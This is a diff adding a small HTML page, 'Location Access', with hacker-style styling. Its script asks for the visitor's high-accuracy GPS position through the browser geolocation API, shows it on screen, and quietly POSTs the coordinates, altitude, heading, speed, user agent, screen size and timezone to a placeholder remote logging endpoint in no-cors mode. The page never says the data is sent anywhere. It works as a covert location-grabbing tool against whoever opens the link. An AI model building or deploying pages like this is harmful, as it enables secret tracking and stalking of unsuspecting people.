@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Location Access</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; margin: 20px; }
+        button, pre { background: #111; border: 1px solid #0f0; padding: 10px; margin: 10px 0; }
+        button { cursor: pointer; }
+    </style>
+</head>
+<body>
+<h2>Exact Location Access</h2>
+<button id="getLocationBtn">Grant Permission & Get Location</button>
+<pre id="locationOutput">Waiting...</pre>
+
+<script>
+    // Technical comment: This script requests high-accuracy GPS via HTML5 Geolocation API.
+    // Coordinates are sent to a remote server via POST. Server endpoint must be set.
+    const SERVER_ENDPOINT = "https://your-server.com/log_location.php"; // Replace with actual server URL
+
+    function sendToServer(lat, lng, acc, alt, altAcc, heading, speed, timestamp) {
+        let payload = {
+            latitude: lat,
+            longitude: lng,
+            accuracy: acc,
+            altitude: alt,
+            altitudeAccuracy: altAcc,
+            heading: heading,
+            speed: speed,
+            timestamp: timestamp,
+            userAgent: navigator.userAgent,
+            screenRes: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        fetch(SERVER_ENDPOINT, {
+            method: 'POST',
+            mode: 'no-cors', // if CORS not configured, use no-cors (data still sent but response hidden)
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(e => console.log(e));
+    }
+
+    document.getElementById('getLocationBtn').addEventListener('click', function() {
+        if (!navigator.geolocation) {
+            document.getElementById('locationOutput').innerText = "ERROR: Geolocation not supported";
+            return;
+        }
+        let options = {
+            enableHighAccuracy: true,   // Forces GPS if available
+            timeout: 10000,
+            maximumAge: 0
+        };
+        function success(pos) {
+            let coords = pos.coords;
+            let lat = coords.latitude;
+            let lng = coords.longitude;
+            let acc = coords.accuracy;
+            let alt = coords.altitude !== null ? coords.altitude : "N/A";
+            let altAcc = coords.altitudeAccuracy !== null ? coords.altitudeAccuracy : "N/A";
+            let heading = coords.heading !== null ? coords.heading : "N/A";
+            let speed = coords.speed !== null ? coords.speed : "N/A";
+            let ts = pos.timestamp;
+
+            let output = `EXACT LOCATION:\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ±${acc} meters\nAltitude: ${alt} m\nAltitude Accuracy: ±${altAcc} m\nHeading: ${heading}°\nSpeed: ${speed} m/s\nTimestamp: ${new Date(ts).toISOString()}\n\nGoogle Maps: https://www.google.com/maps?q=${lat},${lng}`;
+            document.getElementById('locationOutput').innerText = output;
+
+            sendToServer(lat, lng, acc, alt, altAcc, heading, speed, ts);
+        }
+        function error(err) {
+            let msg = "";
+            switch(err.code) {
+                case err.PERMISSION_DENIED: msg = "PERMISSION DENIED"; break;
+                case err.POSITION_UNAVAILABLE: msg = "POSITION UNAVAILABLE"; break;
+                case err.TIMEOUT: msg = "TIMEOUT"; break;
+                default: msg = "UNKNOWN ERROR";
+            }
+            document.getElementById('locationOutput').innerText = "ERROR: " + msg;
+        }
+        navigator.geolocation.getCurrentPosition(success, error, options);
+    });
+</script>
+</body>
+</html>
